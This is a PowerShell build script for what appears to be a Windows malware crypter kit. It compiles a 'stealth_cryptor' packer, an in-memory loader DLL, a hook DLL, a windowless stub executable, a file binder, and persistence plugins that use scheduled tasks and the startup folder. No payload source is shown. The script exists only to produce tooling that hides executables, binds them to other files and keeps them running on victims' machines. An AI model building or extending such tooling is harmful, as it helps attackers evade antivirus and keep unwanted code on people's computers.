Param(
    [switch]$SkipPlugins
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

$root = Split-Path -Parent $MyInvocation.MyCommand.Path
Push-Location $root

$cc = 'x86_64-w64-mingw32-gcc'
$inc = Join-Path $root 'include'
$core = Join-Path $root 'src/core'
$stub = Join-Path $root 'src/stub'
$tools = Join-Path $root 'tools'
$data = Join-Path $root 'data'
$packer_src = Join-Path $core 'stealth_cryptor.c'
$plugins = Join-Path $root 'plugins'
$bin = Join-Path $root 'bin'
$obj = Join-Path $root 'build/obj'
$binPlugins = Join-Path $bin 'plugins'

@($bin, $obj, $binPlugins, $data) | ForEach-Object { if (-not (Test-Path $_)) { New-Item -ItemType Directory -Force -Path $_ | Out-Null } }

function Invoke-Step([string[]]$cmdArgs) {
    Write-Host "[build] $($cmdArgs -join ' ')"
    & $cc @cmdArgs
}

# Core objects
Invoke-Step @('-c','-O2',"-I$inc",'-o', (Join-Path $obj 'argon2.o'), (Join-Path $core 'argon2.c'))
Invoke-Step @('-c','-O2',"-I$inc",'-o', (Join-Path $obj 'crypto.o'), (Join-Path $core 'crypto.c'), '-lbcrypt')
Invoke-Step @('-c','-O2',"-I$inc",'-o', (Join-Path $obj 'plugin_loader.o'), (Join-Path $stub 'plugin_loader.c'))

# Hook DLL
Invoke-Step @('-shared','-O2',"-I$inc",'-o', (Join-Path $bin 'hook.dll'), (Join-Path $stub 'hook.c'), (Join-Path $obj 'argon2.o'), (Join-Path $obj 'crypto.o'), '-lbcrypt')

# Template DLL (in-memory loader)
Invoke-Step @('-shared','-O2',"-I$inc",'-o', (Join-Path $bin 'template.dll'), (Join-Path $stub 'template.c'), (Join-Path $obj 'argon2.o'), (Join-Path $obj 'crypto.o'), '-lbcrypt')

# Stub executable (GUI subsystem, file logs enabled)
Invoke-Step @('-O2','-mwindows','-DENABLE_FILE_LOGS',"-I$inc",'-o', (Join-Path $bin 'stub.exe'), (Join-Path $stub 'stub.c'), (Join-Path $obj 'plugin_loader.o'), (Join-Path $obj 'argon2.o'), (Join-Path $obj 'crypto.o'), '-lbcrypt')

# Packer (console prints for GUI capture)
Invoke-Step @('-O2','-DALLOW_CONSOLE_PRINTS',"-I$inc",'-o', (Join-Path $bin 'stealth_cryptor.exe'), $packer_src, (Join-Path $obj 'argon2.o'), (Join-Path $obj 'crypto.o'), '-lbcrypt')

# Binder utility
Invoke-Step @('-O2',"-I$inc",'-o', (Join-Path $bin 'binder.exe'), (Join-Path $tools 'binder.c'))

if (-not $SkipPlugins) {
    Invoke-Step @('-shared','-O2',"-I$inc",'-o', (Join-Path $binPlugins 'persist_schtasks.dll'), (Join-Path $plugins 'persist_schtasks.c'), '-lshell32')
    Invoke-Step @('-shared','-O2',"-I$inc",'-o', (Join-Path $binPlugins 'persist_startup_folder.dll'), (Join-Path $plugins 'persist_startup_folder.c'))
    Invoke-Step @('-shared','-O2',"-I$inc",'-o', (Join-Path $binPlugins 'popup_test.dll'), (Join-Path $plugins 'popup_test.c'), '-luser32')
    Invoke-Step @('-shared','-O2',"-I$inc",'-o', (Join-Path $binPlugins 'sample_logger.dll'), (Join-Path $plugins 'sample_logger.c'))
}

Pop-Location
Write-Host '[build] done'
